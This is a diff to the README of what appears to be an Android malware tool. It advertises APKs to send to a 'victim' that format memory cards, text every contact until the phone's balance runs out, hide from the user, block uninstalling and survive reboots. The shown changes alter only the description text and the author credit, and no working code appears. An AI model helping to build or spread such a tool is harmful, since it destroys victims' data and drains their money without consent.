@@ -12,7 +12,7 @@ MAYBE HE SHOUD SAY BYE TO HIS DATAS ..XD
 THERE ARE 2 APKS WHICH YOU CAN SEND IT TO THE VICTIM 
 * APK 1 :~
     This APK Will Format Externel Drivers like memory card. 
-    Send SMS message to All contacts saved in the victim Phones
+    Send SMS message to All contacts saved in the victim Phones until balance = 0;
     This APK Will automatically Hide from the user and cant uninstall without Recover.apk
     Runs in background continuously and gets restarted even after device is turned ON/OFF.
     Works in 90% of All new Android Devices !
@@ -34,7 +34,7 @@ PATHCHED DATE -> 28.01.2023
 
 ## PLATFORM TESTED
 
-Works in all Linux Distros.
+Works in all Linux Distros.<br>
 C must be installed
 
 ## HOW TO RECOVER
@@ -44,6 +44,7 @@ INSTALL RECOVER ARK .
 1. GO TO THE Appcrash FOLDER
 2. TYPE chmod +x appcrash
 3. TYPE ./appcrash 
-
+## WHY C
+AM JUST LEARNING C PROGRAMMING LANGUAGE .. THIS IS JUST AN CODE I HAVE WRITTEN TO EXIT THE CONFORT ZONE ;|<br>
 THATS IT . THANKS FOR USING MY TOOL ..!
-TOOL WRITED BY 7R1X 
+TOOL WRITED BY Smukx -> 7R1X 
